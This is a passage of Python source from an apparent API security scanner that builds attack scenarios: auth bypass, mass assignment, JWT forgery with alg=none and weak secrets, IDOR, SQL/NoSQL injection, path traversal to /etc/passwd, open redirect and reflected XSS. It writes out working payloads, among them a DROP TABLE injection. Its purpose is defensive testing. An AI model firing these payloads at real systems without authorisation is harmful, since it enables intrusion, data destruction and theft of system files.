"""Direct HTTP API attack scenario builders (GoalType.API_ATTACK).

These scenarios probe REST endpoints discovered in the SBOM by sending raw HTTP
requests — completely bypassing the agent chat interface.  Each step carries
``target_path`` so the executor routes to ``TargetAppClient.invoke_endpoint``
instead of the chat endpoint.

``build_injection_probe`` is the raw-HTTP counterpart to the chat-mediated
SQL-injection scenario in ``sbom_driven.py``: it fuzzes path/body parameters
directly, with no LLM/tool layer required in front of the database.
``build_path_traversal_probe`` and ``build_open_redirect_probe`` follow the
same shape for filesystem-read and client-controlled-redirect surfaces.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
import uuid

from nuguard.common.response_extraction import build_minimal_payload as _build_realistic_body
from nuguard.models.exploit_chain import (
    HTTP_2XX_SENTINEL,
    ExploitChain,
    ExploitStep,
    GoalType,
    ScenarioType,
)

from .pre_scorer import pre_score
from .scenario_types import AttackScenario

# Fields commonly accepted by web frameworks that grant elevated privilege when
# accepted blindly (mass-assignment / parameter pollution).
_MASS_ASSIGN_BODY: dict = {
    "role": "admin",
    "is_admin": True,
    "privilege_level": "superuser",
    "is_superuser": True,
    "permissions": ["admin", "write", "delete"],
}

_ID_PARAM_PATTERN = re.compile(
    r"\{(?P<param>[^}]+)\}|:(?P<bare>[A-Za-z_][A-Za-z0-9_]*)"
)
_ID_LIKE = {"id", "user_id", "tenant_id", "account_id", "customer_id", "org_id"}


def _replace_first_id_param(
    path: str, path_params: list[str], probe_value: str = "99999"
) -> str | None:
    """Return *path* with the first ID-like param replaced by *probe_value*.

    Returns ``None`` when no replaceable parameter is found.
    """
    for param in path_params:
        if param.lower() in _ID_LIKE:
            # Replace both {param} and :param styles
            replaced = re.sub(
                rf"\{{{re.escape(param)}\}}|:{re.escape(param)}\b",
                probe_value,
                path,
            )
            if replaced != path:
                return replaced
    return None


def build_auth_bypass(
    endpoint_id: str,
    endpoint_name: str,
    path: str,
    method: str = "GET",
    request_body_schema: dict[str, str] | None = None,
    sensitive_fields: list[str] | None = None,
) -> AttackScenario:
    """Build an authentication bypass scenario for a protected endpoint.

    Sends a request to *path* without any auth headers.  Success is defined as
    receiving a 2xx response — which means the endpoint failed to enforce auth.

    For POST/PUT/PATCH endpoints a realistic body is generated from
    *request_body_schema* so that the request passes schema validation and
    reaches the authentication check rather than being rejected with 422.

    *sensitive_fields* (from SBOM ``pii_fields``/``phi_fields``/``pfi_fields``
    metadata on the endpoint or its backing datastore) is used at execution
    time to check whether the bypassed response actually contains sensitive
    data, and here to boost the pre-execution impact score.
    """
    # Build a realistic body for write-method endpoints so the request
    # passes schema validation — auth bypass must be tested on a valid request.
    http_body: dict | None = None
    if method in ("POST", "PUT", "PATCH") and request_body_schema:
        http_body = _build_realistic_body(request_body_schema)

    chain_id = str(uuid.uuid4())
    chain = ExploitChain(
        chain_id=chain_id,
        goal_type=GoalType.API_ATTACK,
        scenario_type=ScenarioType.AUTH_BYPASS,
        sbom_path=[endpoint_id],
        owasp_asi_ref="ASI03 – Identity and Privilege Abuse",
        owasp_llm_ref="LLM05 – Improper Output Handling",
        steps=[
            ExploitStep(
                step_id=f"{chain_id}_s1",
                step_type="INVOKE",
                description=f"Access {endpoint_name} without authentication",
                payload="",
                target_path=path,
                http_method=method,
                http_body=http_body,
                target_node_id=endpoint_id,
                success_signal=HTTP_2XX_SENTINEL,
                on_failure="abort",
                use_llm_eval=True,
                strip_auth=True,
                sensitive_fields=sensitive_fields or [],
            )
        ],
    )
    chain.pre_score = pre_score(
        chain, has_unauth_entry=True, pii_in_path=bool(sensitive_fields)
    )
    return AttackScenario(
        scenario_id=str(uuid.uuid4()),
        goal_type=GoalType.API_ATTACK,
        scenario_type=ScenarioType.AUTH_BYPASS,
        title=f"Authentication Bypass — {endpoint_name}",
        description=(
            f"Probe {method} {path} without credentials.  "
            f"A 2xx response confirms authentication is not enforced."
        ),
        target_node_ids=[endpoint_id],
        impact_score=chain.pre_score,
        chain=chain,
    )


def build_mass_assignment(
    endpoint_id: str,
    endpoint_name: str,
    path: str,
    method: str = "POST",
    request_body_schema: dict[str, str] | None = None,
) -> AttackScenario:
    """Build a mass-assignment scenario for a write-capable endpoint.

    Sends extra privilege-escalating fields (role, is_admin, etc.) in the
    request body.  Success is detection of an echoed privilege value in the
    response, indicating the server accepted and reflected the extra fields.

    When *request_body_schema* is provided (from the SBOM), plausible values are
    generated for all required fields so the request passes schema validation.
    The privilege-escalation fields are then merged on top: the combined body
    looks like a legitimate request that also smuggles in the escalation fields.
    """
    # Start with plausible values for all known schema fields so the request
    # passes validation, then overlay the privilege-escalation fields.
    base_body = _build_realistic_body(request_body_schema) if request_body_schema else {}
    body = {**base_body, **_MASS_ASSIGN_BODY}

    chain_id = str(uuid.uuid4())
    chain = ExploitChain(
        chain_id=chain_id,
        goal_type=GoalType.API_ATTACK,
        scenario_type=ScenarioType.MASS_ASSIGNMENT,
        sbom_path=[endpoint_id],
        owasp_asi_ref="ASI03 – Identity and Privilege Abuse",
        steps=[
            ExploitStep(
                step_id=f"{chain_id}_s1",
                step_type="INVOKE",
                description=f"Send extra privilege fields to {endpoint_name}",
                payload="",
                target_path=path,
                http_method=method,
                http_body=body,
                target_node_id=endpoint_id,
                # OR-matched keywords: the literal escalation value ("superuser")
                # or a JSON-shaped echo of role/is_admin/is_superuser being
                # accepted — catches servers that echo the field name+value back
                # without necessarily using the word "superuser" itself.
                success_signal=(
                    "superuser"
                    '|"role": "admin"|"role":"admin"'
                    '|"is_admin": true|"is_admin":true'
                    '|"is_superuser": true|"is_superuser":true'
                ),
                # Require 2xx so that frameworks (e.g. FastAPI) echoing the request
                # body verbatim inside a 422 validation error do not produce a false
                # positive — the escalation keywords appearing in a rejection is
                # not a success.
                success_requires_2xx=True,
                on_failure="abort",
                use_llm_eval=True,
            )
        ],
    )
    chain.pre_score = pre_score(chain)
    return AttackScenario(
        scenario_id=str(uuid.uuid4()),
        goal_type=GoalType.API_ATTACK,
        scenario_type=ScenarioType.MASS_ASSIGNMENT,
        title=f"Mass Assignment — {endpoint_name}",
        description=(
            f"POST privilege-escalating fields (role, is_admin, is_superuser) to "
            f"{method} {path}.  A 2xx response echoing back an accepted "
            f"escalation field (role=admin, is_admin, is_superuser, or "
            f"privilege_level=superuser) confirms mass assignment."
        ),
        target_node_ids=[endpoint_id],
        impact_score=chain.pre_score,
        chain=chain,
    )


def build_auth_scope_bypass(
    endpoint_id: str,
    endpoint_name: str,
    path: str,
    method: str = "GET",
    auth_scope: str | None = None,
    auth_detail: str | None = None,
    request_body_schema: dict[str, str] | None = None,
) -> AttackScenario:
    """BFLA/RBAC probe — access an endpoint with a lower-privileged or mismatched scope."""
    scope_label = auth_scope or auth_detail or "elevated scope"
    body: dict = _build_realistic_body(request_body_schema or {})
    chain_id = str(uuid.uuid4())
    chain = ExploitChain(
        chain_id=chain_id,
        goal_type=GoalType.API_ATTACK,
        scenario_type=ScenarioType.AUTH_BYPASS,
        sbom_path=[endpoint_id],
        owasp_asi_ref="ASI03 – Identity and Privilege Abuse",
        steps=[
            ExploitStep(
                step_id=f"{chain_id}_s1",
                step_type="INVOKE",
                description=f"Access {endpoint_name} with downgraded scope (BFLA probe)",
                payload="",
                target_path=path,
                http_method=method,
                http_body=body if body else None,
                target_node_id=endpoint_id,
                success_signal=HTTP_2XX_SENTINEL,
                on_failure="abort",
                use_llm_eval=True,
            )
        ],
    )
    chain.pre_score = pre_score(chain)
    return AttackScenario(
        scenario_id=str(uuid.uuid4()),
        goal_type=GoalType.API_ATTACK,
        scenario_type=ScenarioType.AUTH_BYPASS,
        title=f"BFLA/Scope Bypass — {endpoint_name}",
        description=(
            f"Access {method} {path} without required scope '{scope_label}'. "
            "A 2xx response indicates broken function-level authorization."
        ),
        target_node_ids=[endpoint_id],
        impact_score=chain.pre_score,
        chain=chain,
    )


_JWT_WEAK_SECRETS: tuple[str, ...] = ("secret", "changeit", "your-256-bit-secret")

_JWT_FORGED_CLAIMS: dict = {
    "sub": "nuguard-jwt-probe",
    "role": "admin",
    "admin": True,
    "isAdmin": True,
}


def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _jwt_segment(obj: dict) -> str:
    return _b64url(json.dumps(obj, separators=(",", ":")).encode())


def _forge_jwt_alg_none() -> str:
    """Unsigned token with alg=none — trailing dot, empty signature segment."""
    header = _jwt_segment({"alg": "none", "typ": "JWT"})
    payload = _jwt_segment(_JWT_FORGED_CLAIMS)
    return f"{header}.{payload}."


def _forge_jwt_hs256(secret: str) -> str:
    """HS256 token signed with a guessable/default secret."""
    header = _jwt_segment({"alg": "HS256", "typ": "JWT"})
    payload = _jwt_segment(_JWT_FORGED_CLAIMS)
    signing_input = f"{header}.{payload}".encode()
    signature = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    return f"{header}.{payload}.{_b64url(signature)}"


def build_jwt_tampering_probe(
    endpoint_id: str,
    endpoint_name: str,
    path: str,
    method: str = "GET",
    request_body_schema: dict[str, str] | None = None,
) -> AttackScenario:
    """Probe a JWT-protected endpoint with forged tokens.

    Sends the request with any real credentials stripped and replaced by a
    forged ``Authorization: Bearer <token>`` header, covering two classic JWT
    implementation flaws: ``alg: none`` (an unsigned token accepted because
    the verifier trusts the token's own ``alg`` header instead of pinning an
    expected algorithm) and a weak/guessable HMAC secret — a small dictionary
    of common defaults (``"secret"``, ...). A 2xx response to either forged
    token means the server accepted a token it never actually verified.

    Deliberately out of scope for v1: RS256->HS256 algorithm-confusion (needs
    the server's real public key, which the SBOM doesn't capture) and
    brute-forcing beyond the small fixed secret dictionary above.
    """
    body: dict | None = None
    if method in ("POST", "PUT", "PATCH") and request_body_schema:
        body = _build_realistic_body(request_body_schema)

    forged: list[tuple[str, str]] = [("alg=none", _forge_jwt_alg_none())]
    forged += [(f"weak secret {secret!r}", _forge_jwt_hs256(secret)) for secret in _JWT_WEAK_SECRETS]

    chain_id = str(uuid.uuid4())
    steps = [
        ExploitStep(
            step_id=f"{chain_id}_s{i + 1}",
            step_type="INVOKE",
            description=f"Access {endpoint_name} with a forged JWT ({label})",
            payload="",
            target_path=path,
            http_method=method,
            http_body=body,
            target_node_id=endpoint_id,
            success_signal=HTTP_2XX_SENTINEL,
            on_failure="skip" if i < len(forged) - 1 else "abort",
            use_llm_eval=True,
            strip_auth=True,
            extra_headers={"Authorization": f"Bearer {token}"},
        )
        for i, (label, token) in enumerate(forged)
    ]
    chain = ExploitChain(
        chain_id=chain_id,
        goal_type=GoalType.API_ATTACK,
        scenario_type=ScenarioType.JWT_TAMPERING,
        sbom_path=[endpoint_id],
        owasp_asi_ref="ASI03 – Identity and Privilege Abuse",
        owasp_llm_ref="LLM05 – Improper Output Handling",
        steps=steps,
    )
    chain.pre_score = pre_score(chain, has_unauth_entry=True)
    return AttackScenario(
        scenario_id=str(uuid.uuid4()),
        goal_type=GoalType.API_ATTACK,
        scenario_type=ScenarioType.JWT_TAMPERING,
        title=f"JWT Tampering — {endpoint_name}",
        description=(
            f"Access {method} {path} with a forged JWT (alg=none, and HS256 "
            f"signed with {len(_JWT_WEAK_SECRETS)} common weak secrets) in "
            f"place of real credentials.  A 2xx response confirms the server "
            f"accepts a token it never verified."
        ),
        target_node_ids=[endpoint_id],
        impact_score=chain.pre_score,
        chain=chain,
    )


def build_rate_limit_probe(
    endpoint_id: str,
    endpoint_name: str,
    path: str,
    method: str = "GET",
    request_body_schema: dict[str, str] | None = None,
    burst_count: int = 5,
) -> AttackScenario:
    """Safe rate-limit probe — send a bounded burst and check for 429 enforcement."""
    body: dict = _build_realistic_body(request_body_schema or {})
    chain_id = str(uuid.uuid4())
    steps = [
        ExploitStep(
            step_id=f"{chain_id}_s{i + 1}",
            step_type="INVOKE",
            description=f"Rate-limit burst {i + 1}/{burst_count} to {endpoint_name}",
            payload="",
            target_path=path,
            http_method=method,
            http_body=body if body else None,
            target_node_id=endpoint_id,
            depends_on=[f"{chain_id}_s{i}"] if i > 0 else [],
            on_failure="skip",
        )
        for i in range(burst_count)
    ]
    # Last step probes for 429 enforcement — missing 429 = rate-limit bypass
    steps[-1].success_signal = HTTP_2XX_SENTINEL
    steps[-1].on_failure = "abort"
    steps[-1].use_llm_eval = True
    chain = ExploitChain(
        chain_id=chain_id,
        goal_type=GoalType.API_ATTACK,
        scenario_type=ScenarioType.AUTH_BYPASS,
        sbom_path=[endpoint_id],
        owasp_asi_ref="ASI05",
        steps=steps,
    )
    chain.pre_score = pre_score(chain)
    return AttackScenario(
        scenario_id=str(uuid.uuid4()),
        goal_type=GoalType.API_ATTACK,
        scenario_type=ScenarioType.AUTH_BYPASS,
        title=f"Rate-Limit Probe — {endpoint_name} ({burst_count} requests)",
        description=(
            f"Send {burst_count} rapid {method} {path} requests. "
            "A 2xx on the final request without a 429 earlier indicates missing rate-limit enforcement."
        ),
        target_node_ids=[endpoint_id],
        impact_score=chain.pre_score,
        chain=chain,
    )


# Out-of-range sentinel first: catches endpoints that return bulk/wildcard data
# for any unrecognised ID (missing "does this row exist" check entirely).
# Low, likely-allocated ID second: on apps with small sequential-integer
# primary keys (early test/seed users, first few orders/baskets, ...) a
# huge sentinel like 99999 simply doesn't exist yet, so it can never surface
# a *real* cross-tenant leak — it only proves the endpoint 404s/nulls on
# garbage input, which every well-behaved app already does. Probing "1" as a
# second, cheap fallback catches the case where a row *does* exist at that ID
# but belongs to someone else.
_IDOR_PROBE_VALUES: tuple[str, ...] = ("99999", "1")


def build_idor(
    endpoint_id: str,
    endpoint_name: str,
    path: str,
    path_params: list[str],
    sensitive_fields: list[str] | None = None,
) -> AttackScenario | None:
    """Build an IDOR (Insecure Direct Object Reference) scenario.

    Substitutes the first ID-like path parameter with a sequence of probe
    values (an out-of-range sentinel, then a low likely-allocated ID) to test
    whether the server enforces object-level authorisation. The chain stops
    at the first confirmed hit; a miss on one probe value falls through to
    the next since a nonexistent-row response for one ID says nothing about
    whether a real neighbouring row would be protected.

    Returns ``None`` when no substitutable ID parameter is found in *path*.
    """
    probe_paths = [
        p
        for p in (
            _replace_first_id_param(path, path_params, probe_value=v)
            for v in _IDOR_PROBE_VALUES
        )
        if p is not None
    ]
    if not probe_paths:
        return None

    chain_id = str(uuid.uuid4())
    steps = [
        ExploitStep(
            step_id=f"{chain_id}_s{idx}",
            step_type="INVOKE",
            description=f"Access {endpoint_name} with a different object ID",
            payload="",
            target_path=probe_path,
            http_method="GET",
            target_node_id=endpoint_id,
            success_signal=HTTP_2XX_SENTINEL,
            on_failure="abort" if idx == len(probe_paths) else "skip",
            use_llm_eval=True,
            sensitive_fields=sensitive_fields or [],
        )
        for idx, probe_path in enumerate(probe_paths, start=1)
    ]
    chain = ExploitChain(
        chain_id=chain_id,
        goal_type=GoalType.API_ATTACK,
        scenario_type=ScenarioType.IDOR,
        sbom_path=[endpoint_id],
        owasp_asi_ref="ASI03 – Identity and Privilege Abuse",
        steps=steps,
    )
    chain.pre_score = pre_score(chain, pii_in_path=bool(sensitive_fields))
    return AttackScenario(
        scenario_id=str(uuid.uuid4()),
        goal_type=GoalType.API_ATTACK,
        scenario_type=ScenarioType.IDOR,
        title=f"IDOR — {endpoint_name}",
        description=(
            f"Access GET {path} using a different object ID "
            f"({', '.join(_IDOR_PROBE_VALUES)}).  A 2xx response containing "
            f"another record's data (not just any 2xx) indicates IDOR."
        ),
        target_node_ids=[endpoint_id],
        impact_score=chain.pre_score,
        chain=chain,
    )


def _replace_path_param(path: str, param: str, value: str) -> str | None:
    """Return *path* with *param* replaced by *value*, or ``None`` if absent.

    Unlike :func:`_replace_first_id_param`, this substitutes any named path
    parameter — injection candidates aren't limited to ID-like names.
    """
    replaced = re.sub(
        rf"\{{{re.escape(param)}\}}|:{re.escape(param)}\b",
        value,
        path,
    )
    return replaced if replaced != path else None


# Classic error-based SQL injection payloads — designed to break out of a
# naively-interpolated string/numeric literal and surface a DB driver error.
_INJECTION_PAYLOADS: tuple[str, ...] = (
    "' OR '1'='1",
    "'; DROP TABLE x;--",
)

# NoSQL operator-injection payloads (MongoDB-style). Only meaningful as a
# JSON body field value — a dict can't be substituted into a path segment.
_NOSQL_PAYLOADS: tuple[object, ...] = (
    {"$ne": None},
    {"$gt": ""},
)

# Case-insensitive substrings of common DB driver/ORM error messages. A 5xx
# response containing one of these is strong evidence the payload reached a
# database layer unsanitised, regardless of which of the queried
# path/body candidates triggered it.
_DB_ERROR_SIGNATURES: tuple[str, ...] = (
    "you have an error in your sql syntax",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sqlite3.operationalerror",
    "sqlstate",
    "pg_query()",
    "ora-00933",
    "system.data.sqlclient",
    "warning: mysql_",
    "mongoerror",
    "e11000 duplicate key",
    "sequelizedatabaseerror",
)

_DB_ERROR_SUCCESS_SIGNAL = "|".join(_DB_ERROR_SIGNATURES)

# Cap combinatorics: at most this many path params and body fields are
# probed, each with at most this many payloads.
_MAX_INJECTION_PARAMS = 3
_MAX_INJECTION_PAYLOADS_PER_PARAM = 2


def build_injection_probe(
    endpoint_id: str,
    endpoint_name: str,
    path: str,
    method: str = "GET",
    path_params: list[str] | None = None,
    request_body_schema: dict[str, str] | None = None,
    sensitive_fields: list[str] | None = None,
) -> AttackScenario | None:
    """Build a generic SQLi/NoSQLi injection-probe scenario.

    Fuzzes path parameters and request-body fields with error-inducing SQLi
    and NoSQLi payloads, checking each response for a DB driver/ORM error
    signature. This is the raw-HTTP counterpart to the chat-mediated
    ``build_sql_injection`` in ``sbom_driven.py`` — it targets REST
    endpoints with no LLM/tool layer in front of the database, following
    the same probe-then-fall-through chain shape as :func:`build_idor`.

    Returns ``None`` when there are no path or body parameters to probe.
    """
    candidates: list[tuple[str, dict[str, str] | None, dict | None]] = []

    for param in (path_params or [])[:_MAX_INJECTION_PARAMS]:
        for payload in _INJECTION_PAYLOADS[:_MAX_INJECTION_PAYLOADS_PER_PARAM]:
            probe_path = _replace_path_param(path, param, payload)
            if probe_path is not None:
                candidates.append((probe_path, None, None))

    if request_body_schema:
        base_body = _build_realistic_body(request_body_schema)
        for field in list(request_body_schema)[:_MAX_INJECTION_PARAMS]:
            for str_payload in _INJECTION_PAYLOADS[:_MAX_INJECTION_PAYLOADS_PER_PARAM]:
                body: dict = dict(base_body)
                body[field] = str_payload
                candidates.append((path, None, body))
            for nosql_payload in _NOSQL_PAYLOADS:
                body = dict(base_body)
                body[field] = nosql_payload
                candidates.append((path, None, body))

    if not candidates:
        return None

    chain_id = str(uuid.uuid4())
    steps = [
        ExploitStep(
            step_id=f"{chain_id}_s{idx}",
            step_type="INVOKE",
            description=f"Inject payload into {endpoint_name} and check for a DB error signature",
            payload="",
            target_path=probe_path,
            http_method=method,
            http_body=probe_body,
            target_node_id=endpoint_id,
            success_signal=_DB_ERROR_SUCCESS_SIGNAL,
            success_requires_2xx=False,
            on_failure="abort" if idx == len(candidates) else "skip",
            use_llm_eval=True,
            sensitive_fields=sensitive_fields or [],
        )
        for idx, (probe_path, _probe_params, probe_body) in enumerate(candidates, start=1)
    ]
    chain = ExploitChain(
        chain_id=chain_id,
        goal_type=GoalType.API_ATTACK,
        scenario_type=ScenarioType.SQL_INJECTION,
        sbom_path=[endpoint_id],
        owasp_asi_ref="ASI03 – Identity and Privilege Abuse",
        steps=steps,
    )
    chain.pre_score = pre_score(chain, pii_in_path=bool(sensitive_fields))
    return AttackScenario(
        scenario_id=str(uuid.uuid4()),
        goal_type=GoalType.API_ATTACK,
        scenario_type=ScenarioType.SQL_INJECTION,
        title=f"Injection Probe — {endpoint_name}",
        description=(
            f"Fuzz {method} {path}'s path/body parameters with SQLi and "
            f"NoSQLi payloads. A response containing a DB driver/ORM error "
            f"signature indicates the payload reached an unsanitised query."
        ),
        target_node_ids=[endpoint_id],
        impact_score=chain.pre_score,
        chain=chain,
    )


# Parameter names commonly bound to a file/path read on the server side.
_TRAVERSAL_PARAM_HINTS = {
    "file", "filename", "path", "filepath", "doc", "document",
    "page", "template", "include", "attachment", "download",
}

_TRAVERSAL_PAYLOADS: tuple[str, ...] = (
    "../../../../etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
)

# Case-insensitive substrings unique to the target files' actual content —
# not just an error message that happens to mention a path.
_TRAVERSAL_SUCCESS_SIGNATURES: tuple[str, ...] = (
    "root:x:0:0:",
    "daemon:x:1:1:",
    "for 16-bit app support",  # classic win.ini fallback payload signature
)


def build_path_traversal_probe(
    endpoint_id: str,
    endpoint_name: str,
    path: str,
    method: str = "GET",
    path_params: list[str] | None = None,
    request_body_schema: dict[str, str] | None = None,
) -> AttackScenario | None:
    """Build a path-traversal probe scenario.

    Substitutes file/path-like path parameters and body fields with ``../``
    traversal payloads targeting well-known OS files, checking the response
    for content unique to those files (not just an error message that
    happens to mention a path). This is the raw-HTTP counterpart to the
    ``nuguard-js-path-traversal`` semgrep rule — that scans source, this
    probes live behaviour.

    Returns ``None`` when no file/path-like parameter is found.
    """
    candidates: list[tuple[str, dict | None]] = []

    for param in (path_params or []):
        if param.lower() not in _TRAVERSAL_PARAM_HINTS:
            continue
        for payload in _TRAVERSAL_PAYLOADS:
            probe_path = _replace_path_param(path, param, payload)
            if probe_path is not None:
                candidates.append((probe_path, None))

    if request_body_schema:
        base_body = _build_realistic_body(request_body_schema)
        for field in request_body_schema:
            if field.lower() not in _TRAVERSAL_PARAM_HINTS:
                continue
            for payload in _TRAVERSAL_PAYLOADS:
                body: dict = dict(base_body)
                body[field] = payload
                candidates.append((path, body))

    if not candidates:
        return None

    chain_id = str(uuid.uuid4())
    steps = [
        ExploitStep(
            step_id=f"{chain_id}_s{idx}",
            step_type="INVOKE",
            description=f"Probe {endpoint_name} with a path-traversal payload",
            payload="",
            target_path=probe_path,
            http_method=method,
            http_body=probe_body,
            target_node_id=endpoint_id,
            success_signal="|".join(_TRAVERSAL_SUCCESS_SIGNATURES),
            success_requires_2xx=True,
            on_failure="abort" if idx == len(candidates) else "skip",
            use_llm_eval=True,
        )
        for idx, (probe_path, probe_body) in enumerate(candidates, start=1)
    ]
    chain = ExploitChain(
        chain_id=chain_id,
        goal_type=GoalType.API_ATTACK,
        scenario_type=ScenarioType.PATH_TRAVERSAL,
        sbom_path=[endpoint_id],
        owasp_asi_ref="ASI03 – Identity and Privilege Abuse",
        steps=steps,
    )
    chain.pre_score = pre_score(chain)
    return AttackScenario(
        scenario_id=str(uuid.uuid4()),
        goal_type=GoalType.API_ATTACK,
        scenario_type=ScenarioType.PATH_TRAVERSAL,
        title=f"Path Traversal — {endpoint_name}",
        description=(
            f"Fuzz {method} {path}'s file/path-like parameters with ../ "
            f"traversal payloads targeting /etc/passwd and win.ini. A "
            f"response containing that file's content confirms traversal."
        ),
        target_node_ids=[endpoint_id],
        impact_score=chain.pre_score,
        chain=chain,
    )


# Parameter names commonly bound to a client-controlled redirect target.
_REDIRECT_PARAM_HINTS = {
    "url", "redirect", "redirect_url", "redirecturl", "next", "return",
    "returnurl", "return_to", "dest", "destination", "target",
    "callback", "continue", "redir", "goto",
}


def build_open_redirect_probe(
    endpoint_id: str,
    endpoint_name: str,
    path: str,
    method: str = "GET",
    path_params: list[str] | None = None,
    request_body_schema: dict[str, str] | None = None,
) -> AttackScenario | None:
    """Build an open-redirect probe scenario.

    Substitutes redirect-target-like path parameters and body fields with
    an attacker-controlled URL on the RFC 2606 reserved ``.invalid`` TLD
    (guaranteed to never resolve, so the probe can never actually reach — or
    affect — a real host). ``TargetAppClient`` follows redirects by default,
    so if the server issues a 3xx to that marker URL, the resulting DNS
    failure surfaces the marker in the response text (see
    ``TargetAppClient.invoke_endpoint``'s exception handler, which appends
    the unreachable request URL to ``[REQUEST_ERROR: ...]``) — proof the
    endpoint redirected somewhere attacker-controlled.

    Returns ``None`` when no redirect-target-like parameter is found.
    """
    marker = f"https://nuguard-oob-{uuid.uuid4().hex[:12]}.invalid/redirect-canary"
    candidates: list[tuple[str, dict | None]] = []

    for param in (path_params or []):
        if param.lower() not in _REDIRECT_PARAM_HINTS:
            continue
        probe_path = _replace_path_param(path, param, marker)
        if probe_path is not None:
            candidates.append((probe_path, None))

    if request_body_schema:
        base_body = _build_realistic_body(request_body_schema)
        for field in request_body_schema:
            if field.lower() not in _REDIRECT_PARAM_HINTS:
                continue
            body: dict = dict(base_body)
            body[field] = marker
            candidates.append((path, body))

    if not candidates:
        return None

    chain_id = str(uuid.uuid4())
    steps = [
        ExploitStep(
            step_id=f"{chain_id}_s{idx}",
            step_type="INVOKE",
            description=f"Probe {endpoint_name} with an attacker-controlled redirect target",
            payload="",
            target_path=probe_path,
            http_method=method,
            http_body=probe_body,
            target_node_id=endpoint_id,
            success_signal=marker,
            success_requires_2xx=False,
            on_failure="abort" if idx == len(candidates) else "skip",
            use_llm_eval=True,
        )
        for idx, (probe_path, probe_body) in enumerate(candidates, start=1)
    ]
    chain = ExploitChain(
        chain_id=chain_id,
        goal_type=GoalType.API_ATTACK,
        scenario_type=ScenarioType.OPEN_REDIRECT,
        sbom_path=[endpoint_id],
        owasp_asi_ref="ASI03 – Identity and Privilege Abuse",
        steps=steps,
    )
    chain.pre_score = pre_score(chain)
    return AttackScenario(
        scenario_id=str(uuid.uuid4()),
        goal_type=GoalType.API_ATTACK,
        scenario_type=ScenarioType.OPEN_REDIRECT,
        title=f"Open Redirect — {endpoint_name}",
        description=(
            f"Set {method} {path}'s redirect-target parameter to an "
            f"attacker-controlled .invalid marker URL. Evidence the server "
            f"attempted to redirect there confirms an open redirect."
        ),
        target_node_ids=[endpoint_id],
        impact_score=chain.pre_score,
        chain=chain,
    )


# Unescaped-reflection XSS payload. Uses a per-scenario random marker so a
# match can only be the payload itself, never a coincidental keyword in
# legitimate content.
def _xss_payload(marker: str) -> str:
    return f"<script>/*{marker}*/</script>"


def build_reflected_xss_probe(
    endpoint_id: str,
    endpoint_name: str,
    path: str,
    method: str = "GET",
    path_params: list[str] | None = None,
    request_body_schema: dict[str, str] | None = None,
) -> AttackScenario | None:
    """Build a reflected-XSS probe scenario for server-rendered HTML surfaces.

    Substitutes path parameters and body fields with a ``<script>`` payload
    carrying a random per-scenario marker, then checks whether the exact,
    unescaped payload is echoed back in the response body. This is the
    raw-HTTP counterpart to ``build_output_xss`` (``output_handling.py``),
    which only covers XSS an LLM agent is tricked into generating — it's
    needed for non-AI/hybrid apps like Juice Shop whose HTML pages reflect
    request parameters (search results, error pages, form re-population)
    entirely outside any chat surface.

    Known limitation: a value reflected verbatim in a JSON API response is
    not itself exploitable unless a downstream page later renders it as
    HTML (stored/second-order XSS) — this probe cannot distinguish that
    from a directly-HTML-rendered reflection, since ``TargetAppClient``
    does not currently expose response ``Content-Type``. ``use_llm_eval``
    is enabled as a secondary judge to help filter such cases.

    Returns ``None`` when there are no path or body parameters to probe.
    """
    marker = f"nuguardxss{uuid.uuid4().hex[:10]}"
    payload = _xss_payload(marker)
    candidates: list[tuple[str, dict | None]] = []

    for param in (path_params or [])[:_MAX_INJECTION_PARAMS]:
        probe_path = _replace_path_param(path, param, payload)
        if probe_path is not None:
            candidates.append((probe_path, None))

    if request_body_schema:
        base_body = _build_realistic_body(request_body_schema)
        for field in list(request_body_schema)[:_MAX_INJECTION_PARAMS]:
            body: dict = dict(base_body)
            body[field] = payload
            candidates.append((path, body))

    if not candidates:
        return None

    chain_id = str(uuid.uuid4())
    steps = [
        ExploitStep(
            step_id=f"{chain_id}_s{idx}",
            step_type="INVOKE",
            description=f"Probe {endpoint_name} for unescaped reflection of an XSS payload",
            payload="",
            target_path=probe_path,
            http_method=method,
            http_body=probe_body,
            target_node_id=endpoint_id,
            success_signal=payload,
            success_requires_2xx=False,
            on_failure="abort" if idx == len(candidates) else "skip",
            use_llm_eval=True,
        )
        for idx, (probe_path, probe_body) in enumerate(candidates, start=1)
    ]
    chain = ExploitChain(
        chain_id=chain_id,
        goal_type=GoalType.API_ATTACK,
        scenario_type=ScenarioType.REFLECTED_XSS,
        sbom_path=[endpoint_id],
        owasp_asi_ref="ASI06",
        owasp_llm_ref="LLM05 – Improper Output Handling",
        steps=steps,
    )
    chain.pre_score = pre_score(chain)
    return AttackScenario(
        scenario_id=str(uuid.uuid4()),
        goal_type=GoalType.API_ATTACK,
        scenario_type=ScenarioType.REFLECTED_XSS,
        title=f"Reflected XSS — {endpoint_name}",
        description=(
            f"Fuzz {method} {path}'s path/body parameters with a "
            f"<script> payload. An exact, unescaped echo of the payload in "
            f"the response confirms unsanitized reflection."
        ),
        target_node_ids=[endpoint_id],
        impact_score=chain.pre_score,
        chain=chain,
    )


def build_open_data_exposure(
    endpoint_id: str,
    endpoint_name: str,
    path: str,
    method: str = "GET",
    sensitive_fields: list[str] | None = None,
) -> AttackScenario:
    """Probe an already-open (no-auth-required) endpoint for data exposure.

    Unlike :func:`build_auth_bypass`, this endpoint requires no
    authentication by design — there is no auth check to bypass.  The
    question is simply whether it returns sensitive data (PII/PHI/PFI
    declared on its backing datastore) to anyone who calls it.  Success
    requires HTTP 2xx *and* evidence the body actually contains that data —
    see ``response_data_check.check_response_for_data_exposure``.
    """
    chain_id = str(uuid.uuid4())
    chain = ExploitChain(
        chain_id=chain_id,
        goal_type=GoalType.API_ATTACK,
        scenario_type=ScenarioType.DIRECT_PII_EXTRACTION,
        sbom_path=[endpoint_id],
        owasp_asi_ref="ASI03 – Identity and Privilege Abuse",
        owasp_llm_ref="LLM06 – Sensitive Information Disclosure",
        steps=[
            ExploitStep(
                step_id=f"{chain_id}_s1",
                step_type="INVOKE",
                description=f"Probe open endpoint {endpoint_name} for sensitive data exposure",
                payload="",
                target_path=path,
                http_method=method,
                target_node_id=endpoint_id,
                success_signal=HTTP_2XX_SENTINEL,
                on_failure="abort",
                use_llm_eval=True,
